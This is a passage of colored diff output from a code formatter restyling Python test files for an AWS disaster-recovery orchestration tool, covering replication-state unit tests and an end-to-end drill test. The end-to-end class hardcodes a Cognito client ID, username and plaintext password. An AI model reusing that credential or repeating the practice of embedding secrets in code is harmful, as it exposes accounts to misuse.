False\u001b[0m\n\u001b[31m-        assert result['unhealthyCount'] == 1\u001b[0m\n\u001b[31m-        assert result['unhealthyServers'][0]['serverId'] == 's-1'\u001b[0m\n\u001b[31m-        assert result['unhealthyServers'][0]['replicationState'] == 'DISCONNECTED'\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_server_replication_states(\"us-east-1\", [\"s-1\"])\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is False\u001b[0m\n\u001b[32m+        assert result[\"unhealthyCount\"] == 1\u001b[0m\n\u001b[32m+        assert result[\"unhealthyServers\"][0][\"serverId\"] == \"s-1\"\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            result[\"unhealthyServers\"][0][\"replicationState\"] == \"DISCONNECTED\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_empty_server_list(self, mock_boto_client):\n         \"\"\"Should be valid for empty server list.\"\"\"\n         from index import validate_server_replication_states\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_server_replication_states('us-east-1', [])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['healthyCount'] == 0\u001b[0m\n\u001b[31m-        assert result['unhealthyCount'] == 0\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_server_replication_states(\"us-east-1\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"healthyCount\"] == 0\u001b[0m\n\u001b[32m+        assert result[\"unhealthyCount\"] == 0\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_mixed_healthy_unhealthy(self, mock_boto_client):\n         \"\"\"Should be invalid when some servers are unhealthy.\"\"\"\n         from index import validate_server_replication_states\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_drs.describe_source_servers.return_value = {\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'sourceServerID': 's-1',\u001b[0m\n\u001b[31m-                    'dataReplicationInfo': {'dataReplicationState': 'CONTINUOUS_REPLICATION'},\u001b[0m\n\u001b[31m-                    'lifeCycle': {'state': 'READY_FOR_TEST'},\u001b[0m\n\u001b[31m-                    'sourceProperties': {'identificationHints': {'hostname': 'healthy-server'}}\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'sourceServerID': 's-2',\u001b[0m\n\u001b[31m-                    'dataReplicationInfo': {'dataReplicationState': 'STALLED'},\u001b[0m\n\u001b[31m-                    'lifeCycle': {'state': 'READY_FOR_TEST'},\u001b[0m\n\u001b[31m-                    'sourceProperties': {'identificationHints': {'hostname': 'stalled-server'}}\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        mock_boto_client.return_value = mock_drs\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_server_replication_states('us-east-1', ['s-1', 's-2'])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is False\u001b[0m\n\u001b[31m-        assert result['healthyCount'] == 1\u001b[0m\n\u001b[31m-        assert result['unhealthyCount'] == 1\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[31m-    pytest.main([__file__, '-v'])\u001b[0m\n\u001b[32m+            \"items\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-1\",\u001b[0m\n\u001b[32m+                    \"dataReplicationInfo\": {\u001b[0m\n\u001b[32m+                        \"dataReplicationState\": \"CONTINUOUS_REPLICATION\"\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    \"lifeCycle\": {\"state\": \"READY_FOR_TEST\"},\u001b[0m\n\u001b[32m+                    \"sourceProperties\": {\u001b[0m\n\u001b[32m+                        \"identificationHints\": {\"hostname\": \"healthy-server\"}\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-2\",\u001b[0m\n\u001b[32m+                    \"dataReplicationInfo\": {\"dataReplicationState\": \"STALLED\"},\u001b[0m\n\u001b[32m+                    \"lifeCycle\": {\"state\": \"READY_FOR_TEST\"},\u001b[0m\n\u001b[32m+                    \"sourceProperties\": {\u001b[0m\n\u001b[32m+                        \"identificationHints\": {\"hostname\": \"stalled-server\"}\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+        mock_boto_client.return_value = mock_drs\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_server_replication_states(\u001b[0m\n\u001b[32m+            \"us-east-1\", [\"s-1\", \"s-2\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is False\u001b[0m\n\u001b[32m+        assert result[\"healthyCount\"] == 1\u001b[0m\n\u001b[32m+        assert result[\"unhealthyCount\"] == 1\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n\u001b[32m+    pytest.main([__file__, \"-v\"])\u001b[0m\n\u001b[1m--- tests/python/automated_e2e_test.py\t2025-12-06 20:02:33.632439+00:00\u001b[0m\n\u001b[1m+++ tests/python/automated_e2e_test.py\t2026-01-02 15:49:03.691708+00:00\u001b[0m\n\u001b[36m@@ -11,509 +11,599 @@\u001b[0m\n from typing import Dict, Any, List, Optional\n import logging\n \n # Configure logging\n logging.basicConfig(\n\u001b[31m-    level=logging.INFO,\u001b[0m\n\u001b[31m-    format='%(asctime)s - %(levelname)s - %(message)s'\u001b[0m\n\u001b[32m+    level=logging.INFO, format=\"%(asctime)s - %(levelname)s - %(message)s\"\u001b[0m\n )\n logger = logging.getLogger(__name__)\n \n\u001b[32m+\u001b[0m\n class AutomatedE2ETest:\n     \"\"\"End-to-end automated test orchestrator.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def __init__(self, api_endpoint: str, plan_id: str, region: str = 'us-east-1'):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def __init__(\u001b[0m\n\u001b[32m+        self, api_endpoint: str, plan_id: str, region: str = \"us-east-1\"\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"\n         Initialize test orchestrator.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             api_endpoint: API Gateway endpoint URL\n             plan_id: Recovery plan ID to execute\n             region: AWS region\n         \"\"\"\n\u001b[31m-        self.api_endpoint = api_endpoint.rstrip('/')\u001b[0m\n\u001b[32m+        self.api_endpoint = api_endpoint.rstrip(\"/\")\u001b[0m\n         self.plan_id = plan_id\n         self.region = region\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Initialize AWS clients\n\u001b[31m-        self.drs = boto3.client('drs', region_name=region)\u001b[0m\n\u001b[31m-        self.ec2 = boto3.client('ec2', region_name=region)\u001b[0m\n\u001b[31m-        self.dynamodb = boto3.client('dynamodb', region_name=region)\u001b[0m\n\u001b[31m-        self.cognito = boto3.client('cognito-idp', region_name=region)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        self.drs = boto3.client(\"drs\", region_name=region)\u001b[0m\n\u001b[32m+        self.ec2 = boto3.client(\"ec2\", region_name=region)\u001b[0m\n\u001b[32m+        self.dynamodb = boto3.client(\"dynamodb\", region_name=region)\u001b[0m\n\u001b[32m+        self.cognito = boto3.client(\"cognito-idp\", region_name=region)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Test configuration\n\u001b[31m-        self.execution_table = 'drs-orchestration-execution-history-test'\u001b[0m\n\u001b[32m+        self.execution_table = \"drs-orchestration-execution-history-test\"\u001b[0m\n         self.max_wait_time = 1800  # 30 minutes\n         self.poll_interval = 15  # 15 seconds\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Cognito configuration\n\u001b[31m-        self.user_pool_client_id = '48fk7bjefk88aejr1rc7dvmbv0'\u001b[0m\n\u001b[31m-        self.username = 'testuser@example.com'\u001b[0m\n\u001b[31m-        self.password = 'IiG2b1o+D$'\u001b[0m\n\u001b[32m+        self.user_pool_client_id = \"48fk7bjefk88aejr1rc7dvmbv0\"\u001b[0m\n\u001b[32m+        self.username = \"testuser@example.com\"\u001b[0m\n\u001b[32m+        self.password = \"IiG2b1o+D$\"\u001b[0m\n         self.auth_token = None\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test results\n         self.results = {\n\u001b[31m-            'test_start_time': None,\u001b[0m\n\u001b[31m-            'test_end_time': None,\u001b[0m\n\u001b[31m-            'execution_id': None,\u001b[0m\n\u001b[31m-            'execution_status': None,\u001b[0m\n\u001b[31m-            'waves': [],\u001b[0m\n\u001b[31m-            'drs_jobs': [],\u001b[0m\n\u001b[31m-            'ec2_instances': [],\u001b[0m\n\u001b[31m-            'success': False,\u001b[0m\n\u001b[31m-            'errors': [],\u001b[0m\n\u001b[31m-            'warnings': []\u001b[0m\n\u001b[32m+            \"test_start_time\": None,\u001b[0m\n\u001b[32m+            \"test_end_time\": None,\u001b[0m\n\u001b[32m+            \"execution_id\": None,\u001b[0m\n\u001b[32m+            \"execution_status\": None,\u001b[0m\n\u001b[32m+            \"waves\": [],\u001b[0m\n\u001b[32m+            \"drs_jobs\": [],\u001b[0m\n\u001b[32m+            \"ec2_instances\": [],\u001b[0m\n\u001b[32m+            \"success\": False,\u001b[0m\n\u001b[32m+            \"errors\": [],\u001b[0m\n\u001b[32m+            \"warnings\": [],\u001b[0m\n         }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def run_test(self, is_drill: bool = True) -> Dict[str, Any]:\n         \"\"\"\n         Run complete end-to-end test.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             is_drill: True for drill, False for recovery\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Dictionary containing test results\n         \"\"\"\n         try:\n\u001b[31m-            self.results['test_start_time'] = datetime.now(timezone.utc).isoformat()\u001b[0m\n\u001b[32m+            self.results[\"test_start_time\"] = datetime.now(\u001b[0m\n\u001b[32m+                timezone.utc\u001b[0m\n\u001b[32m+            ).isoformat()\u001b[0m\n             logger.info(\"=\" * 80)\n             logger.info(\"STARTING END-TO-END AUTOMATED TEST\")\n             logger.info(f\"Plan ID: {self.plan_id}\")\n\u001b[31m-            logger.info(f\"Execution Type: {'DRILL' if is_drill else 'RECOVERY'}\")\u001b[0m\n\u001b[32m+            logger.info(\u001b[0m\n\u001b[32m+                f\"Execution Type: {'DRILL' if is_drill else 'RECOVERY'}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             logger.info(\"=\" * 80)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 0: Authenticate\n             logger.info(\"\\n[PHASE 0] Authenticating with Cognito...\")\n             self._authenticate()\n             logger.info(f\"\u2705 Authentication successful\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 1: Trigger Execution\n             logger.info(\"\\n[PHASE 1] Triggering execution via API...\")\n             execution_id = self._trigger_execution(is_drill)\n\u001b[31m-            self.results['execution_id'] = execution_id\u001b[0m\n\u001b[32m+            self.results[\"execution_id\"] = execution_id\u001b[0m\n             logger.info(f\"\u2705 Execution triggered: {execution_id}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 2: Monitor Orchestration System\n             logger.info(\"\\n[PHASE 2] Monitoring orchestration system...\")\n             execution_data = self._monitor_orchestration(execution_id)\n             logger.info(f\"\u2705 Orchestration monitoring complete\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 3: Monitor DRS Jobs\n             logger.info(\"\\n[PHASE 3] Monitoring DRS jobs...\")\n             drs_results = self._monitor_drs_jobs(execution_data)\n             logger.info(f\"\u2705 DRS monitoring complete\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 4: Validate EC2 Instances\n             logger.info(\"\\n[PHASE 4] Validating EC2 instances...\")\n             ec2_results = self._validate_ec2_instances(drs_results)\n             logger.info(f\"\u2705 EC2 validation complete\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 5: Generate Report\n             logger.info(\"\\n[PHASE 5] Generating test report...\")\n             self._generate_report()\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Determine overall success\n\u001b[31m-            self.results['success'] = (\u001b[0m\n\u001b[31m-                self.results['execution_status'] == 'COMPLETED' and\u001b[0m\n\u001b[31m-                all(w.get('status') == 'COMPLETED' for w in self.results['waves']) and\u001b[0m\n\u001b[31m-                all(j.get('success', False) for j in self.results['drs_jobs']) and\u001b[0m\n\u001b[31m-                all(i.get('running', False) for i in self.results['ec2_instances'])\u001b[0m\n\u001b[31m-            )\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[31m-            self.results['test_end_time'] = datetime.now(timezone.utc).isoformat()\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            self.results[\"success\"] = (\u001b[0m\n\u001b[32m+                self.results[\"execution_status\"] == \"COMPLETED\"\u001b[0m\n\u001b[32m+                and all(\u001b[0m\n\u001b[32m+                    w.get(\"status\") == \"COMPLETED\"\u001b[0m\n\u001b[32m+                    for w in self.results[\"waves\"]\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+                and all(\u001b[0m\n\u001b[32m+                    j.get(\"success\", False) for j in self.results[\"drs_jobs\"]\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+                and all(\u001b[0m\n\u001b[32m+                    i.get(\"running\", False)\u001b[0m\n\u001b[32m+                    for i in self.results[\"ec2_instances\"]\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            self.results[\"test_end_time\"] = datetime.now(\u001b[0m\n\u001b[32m+                timezone.utc\u001b[0m\n\u001b[32m+            ).isoformat()\u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(\"\\n\" + \"=\" * 80)\n\u001b[31m-            if self.results['success']:\u001b[0m\n\u001b[32m+            if self.results[\"success\"]:\u001b[0m\n                 logger.info(\"\u2705 TEST PASSED - All validations successful\")\n             else:\n                 logger.warning(\"\u274c TEST FAILED - See errors below\")\n\u001b[31m-                for error in self.results['errors']:\u001b[0m\n\u001b[32m+                for error in self.results[\"errors\"]:\u001b[0m\n                     logger.error(f\"  - {error}\")\n             logger.info(\"=\" * 80)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             return self.results\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n\u001b[31m-            logger.error(f\"\u274c Test failed with exception: {str(e)}\", exc_info=True)\u001b[0m\n\u001b[31m-            self.results['errors'].append(f\"Test exception: {str(e)}\")\u001b[0m\n\u001b[31m-            self.results['success'] = False\u001b[0m\n\u001b[31m-            self.results['test_end_time'] = datetime.now(timezone.utc).isoformat()\u001b[0m\n\u001b[32m+            logger.error(\u001b[0m\n\u001b[32m+                f\"\u274c Test failed with exception: {str(e)}\", exc_info=True\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+            self.results[\"errors\"].append(f\"Test exception: {str(e)}\")\u001b[0m\n\u001b[32m+            self.results[\"success\"] = False\u001b[0m\n\u001b[32m+            self.results[\"test_end_time\"] = datetime.now(\u001b[0m\n\u001b[32m+                timezone.utc\u001b[0m\n\u001b[32m+            ).isoformat()\u001b[0m\n             return self.results\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _authenticate(self) -> None:\n         \"\"\"Authenticate with Cognito and get JWT token.\"\"\"\n         try:\n             response = self.cognito.initiate_auth(\n                 ClientId=self.user_pool_client_id,\n\u001b[31m-                AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[32m+                AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n                 AuthParameters={\n\u001b[31m-                    'USERNAME': self.username,\u001b[0m\n\u001b[31m-                    'PASSWORD': self.password\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            )\u001b[0m\n\u001b[31m-            self.auth_token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+                    \"USERNAME\": self.username,\u001b[0m\n\u001b[32m+                    \"PASSWORD\": self.password,\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+            self.auth_token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n             logger.info(f\"  Token obtained (length: {len(self.auth_token)})\")\n         except Exception as e:\n             logger.error(f\"Failed to authenticate: {str(e)}\")\n             raise\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _trigger_execution(self, is_drill: bool) -> str:\n         \"\"\"\n         Trigger execution via API Gateway.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             is_drill: True for drill, False for recovery\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Execution ID\n         \"\"\"\n         try:\n             url = f\"{self.api_endpoint}/executions\"\n             payload = {\n\u001b[31m-                'PlanId': self.plan_id,\u001b[0m\n\u001b[31m-                'ExecutionType': 'DRILL' if is_drill else 'RECOVERY',\u001b[0m\n\u001b[31m-                'InitiatedBy': self.username\u001b[0m\n\u001b[32m+                \"PlanId\": self.plan_id,\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"DRILL\" if is_drill else \"RECOVERY\",\u001b[0m\n\u001b[32m+                \"InitiatedBy\": self.username,\u001b[0m\n             }\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {self.auth_token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {self.auth_token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(f\"POST {url}\")\n             logger.info(f\"Payload: {json.dumps(payload, indent=2)}\")\n\u001b[31m-            \u001b[0m\n\u001b[31m-            response = requests.post(url, json=payload, headers=headers, timeout=30)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            response = requests.post(\u001b[0m\n\u001b[32m+                url, json=payload, headers=headers, timeout=30\u001b[0m\n\u001b[32m+            )\u001b[0m\n             response.raise_for_status()\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             result = response.json()\n\u001b[31m-            execution_id = result.get('executionId')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            execution_id = result.get(\"executionId\")\u001b[0m\n\u001b[32m+\u001b[0m\n             if not execution_id:\n                 raise ValueError(f\"No executionId in response: {result}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(f\"Response: {json.dumps(result, indent=2)}\")\n             return execution_id\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Failed to trigger execution: {str(e)}\")\n             raise\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _monitor_orchestration(self, execution_id: str) -> Dict[str, Any]:\n         \"\"\"\n         Monitor orchestration system until execution completes.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             execution_id: Execution ID to monitor\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Final execution data\n         \"\"\"\n         start_time = time.time()\n         last_status = None\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         while time.time() - start_time < self.max_wait_time:\n             try:\n                 # Query DynamoDB for execution state\n                 response = self.dynamodb.get_item(\n                     TableName=self.execution_table,\n                     Key={\n\u001b[31m-                        'ExecutionId': {'S': execution_id},\u001b[0m\n\u001b[31m-                        'PlanId': {'S': self.plan_id}\u001b[0m\n\u001b[31m-                    }\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[31m-                if 'Item' not in response:\u001b[0m\n\u001b[31m-                    logger.warning(f\"Execution not found in DynamoDB: {execution_id}\")\u001b[0m\n\u001b[32m+                        \"ExecutionId\": {\"S\": execution_id},\u001b[0m\n\u001b[32m+                        \"PlanId\": {\"S\": self.plan_id},\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                if \"Item\" not in response:\u001b[0m\n\u001b[32m+                    logger.warning(\u001b[0m\n\u001b[32m+                        f\"Execution not found in DynamoDB: {execution_id}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     time.sleep(self.poll_interval)\n                     continue\n\u001b[31m-                \u001b[0m\n\u001b[31m-                execution = self._parse_dynamodb_item(response['Item'])\u001b[0m\n\u001b[31m-                status = execution.get('Status', 'UNKNOWN')\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                execution = self._parse_dynamodb_item(response[\"Item\"])\u001b[0m\n\u001b[32m+                status = execution.get(\"Status\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Log status changes\n                 if status != last_status:\n                     elapsed = int(time.time() - start_time)\n                     logger.info(f\"  [{elapsed}s] Status: {status}\")\n                     last_status = status\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check for completion\n\u001b[31m-                if status in ['COMPLETED', 'FAILED', 'TIMEOUT']:\u001b[0m\n\u001b[31m-                    self.results['execution_status'] = status\u001b[0m\n\u001b[31m-                    self.results['waves'] = self._extract_wave_data(execution)\u001b[0m\n\u001b[31m-                    logger.info(f\"  Execution {status} after {int(time.time() - start_time)}s\")\u001b[0m\n\u001b[32m+                if status in [\"COMPLETED\", \"FAILED\", \"TIMEOUT\"]:\u001b[0m\n\u001b[32m+                    self.results[\"execution_status\"] = status\u001b[0m\n\u001b[32m+                    self.results[\"waves\"] = self._extract_wave_data(execution)\u001b[0m\n\u001b[32m+                    logger.info(\u001b[0m\n\u001b[32m+                        f\"  Execution {status} after {int(time.time() - start_time)}s\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     return execution\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 time.sleep(self.poll_interval)\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n             except Exception as e:\n                 logger.error(f\"Error monitoring orchestration: {str(e)}\")\n\u001b[31m-                self.results['errors'].append(f\"Orchestration monitoring error: {str(e)}\")\u001b[0m\n\u001b[32m+                self.results[\"errors\"].append(\u001b[0m\n\u001b[32m+                    f\"Orchestration monitoring error: {str(e)}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n                 time.sleep(self.poll_interval)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Timeout\n\u001b[31m-        logger.error(f\"\u274c Orchestration monitoring timed out after {self.max_wait_time}s\")\u001b[0m\n\u001b[31m-        self.results['errors'].append(f\"Orchestration timeout after {self.max_wait_time}s\")\u001b[0m\n\u001b[32m+        logger.error(\u001b[0m\n\u001b[32m+            f\"\u274c Orchestration monitoring timed out after {self.max_wait_time}s\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        self.results[\"errors\"].append(\u001b[0m\n\u001b[32m+            f\"Orchestration timeout after {self.max_wait_time}s\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         raise TimeoutError(f\"Execution monitoring timed out\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def _monitor_drs_jobs(self, execution_data: Dict[str, Any]) -> List[Dict[str, Any]]:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def _monitor_drs_jobs(\u001b[0m\n\u001b[32m+        self, execution_data: Dict[str, Any]\u001b[0m\n\u001b[32m+    ) -> List[Dict[str, Any]]:\u001b[0m\n         \"\"\"\n         Monitor DRS jobs directly via DRS API.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             execution_data: Execution data from DynamoDB\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             List of DRS job results\n         \"\"\"\n         drs_results = []\n\u001b[31m-        waves = execution_data.get('Waves', [])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        waves = execution_data.get(\"Waves\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in waves:\n\u001b[31m-            job_id = wave.get('JobId')\u001b[0m\n\u001b[31m-            wave_id = wave.get('WaveId', 'unknown')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            job_id = wave.get(\"JobId\")\u001b[0m\n\u001b[32m+            wave_id = wave.get(\"WaveId\", \"unknown\")\u001b[0m\n\u001b[32m+\u001b[0m\n             if not job_id:\n                 logger.warning(f\"  Wave {wave_id} has no JobId\")\n\u001b[31m-                self.results['warnings'].append(f\"Wave {wave_id} missing JobId\")\u001b[0m\n\u001b[32m+                self.results[\"warnings\"].append(\u001b[0m\n\u001b[32m+                    f\"Wave {wave_id} missing JobId\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n                 continue\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(f\"  Monitoring DRS job {job_id} (Wave {wave_id})...\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             try:\n                 # Query DRS for job details\n\u001b[31m-                response = self.drs.describe_jobs(\u001b[0m\n\u001b[31m-                    filters={'jobIDs': [job_id]}\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[31m-                if not response.get('items'):\u001b[0m\n\u001b[32m+                response = self.drs.describe_jobs(filters={\"jobIDs\": [job_id]})\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                if not response.get(\"items\"):\u001b[0m\n                     logger.warning(f\"  No DRS job found for ID {job_id}\")\n\u001b[31m-                    self.results['warnings'].append(f\"DRS job {job_id} not found\")\u001b[0m\n\u001b[32m+                    self.results[\"warnings\"].append(\u001b[0m\n\u001b[32m+                        f\"DRS job {job_id} not found\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     continue\n\u001b[31m-                \u001b[0m\n\u001b[31m-                job = response['items'][0]\u001b[0m\n\u001b[31m-                job_status = job.get('status', 'UNKNOWN')\u001b[0m\n\u001b[31m-                servers = job.get('participatingServers', [])\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                job = response[\"items\"][0]\u001b[0m\n\u001b[32m+                job_status = job.get(\"status\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                servers = job.get(\"participatingServers\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check server launch statuses\n\u001b[31m-                all_launched = all(s.get('launchStatus') == 'LAUNCHED' for s in servers)\u001b[0m\n\u001b[31m-                any_failed = any(s.get('launchStatus') in ['LAUNCH_FAILED', 'FAILED', 'TERMINATED'] for s in servers)\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                all_launched = all(\u001b[0m\n\u001b[32m+                    s.get(\"launchStatus\") == \"LAUNCHED\" for s in servers\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+                any_failed = any(\u001b[0m\n\u001b[32m+                    s.get(\"launchStatus\")\u001b[0m\n\u001b[32m+                    in [\"LAUNCH_FAILED\", \"FAILED\", \"TERMINATED\"]\u001b[0m\n\u001b[32m+                    for s in servers\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 job_result = {\n\u001b[31m-                    'job_id': job_id,\u001b[0m\n\u001b[31m-                    'wave_id': wave_id,\u001b[0m\n\u001b[31m-                    'job_status': job_status,\u001b[0m\n\u001b[31m-                    'servers': [{\u001b[0m\n\u001b[31m-                        'source_server_id': s.get('sourceServerID'),\u001b[0m\n\u001b[31m-                        'launch_status': s.get('launchStatus'),\u001b[0m\n\u001b[31m-                        'instance_id': s.get('recoveryInstanceID'),\u001b[0m\n\u001b[31m-                        'hostname': s.get('hostname', 'unknown')\u001b[0m\n\u001b[31m-                    } for s in servers],\u001b[0m\n\u001b[31m-                    'all_launched': all_launched,\u001b[0m\n\u001b[31m-                    'any_failed': any_failed,\u001b[0m\n\u001b[31m-                    'success': all_launched and not any_failed\u001b[0m\n\u001b[32m+                    \"job_id\": job_id,\u001b[0m\n\u001b[32m+                    \"wave_id\": wave_id,\u001b[0m\n\u001b[32m+                    \"job_status\": job_status,\u001b[0m\n\u001b[32m+                    \"servers\": [\u001b[0m\n\u001b[32m+                        {\u001b[0m\n\u001b[32m+                            